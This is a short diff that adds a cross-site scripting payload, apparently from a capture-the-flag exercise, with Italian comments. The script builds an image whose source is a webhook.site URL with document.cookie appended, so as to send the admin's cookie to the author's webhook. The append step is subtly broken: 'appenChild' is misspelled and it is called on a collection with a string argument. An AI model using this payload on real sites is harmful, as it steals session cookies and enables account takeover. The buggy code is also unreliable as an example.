@@ -1,0 +1,9 @@
+<script>
+var img = document.createElement("img");
+img.src = "https://webhook.site/02e6f13d-8487-430a-a0d8-452aafbd6d2f?" + document.cookie
+//Sarebbe Webhook mio +? finale, aggiungo alla fine il cookie dell'admin
+var src = document.getElementsByTagName("body");
+//Elemento pagina che va trovato all'interno della pagina
+src.appenChild("img")
+//Elemento della pagina a cui attacco l'src
+</script>
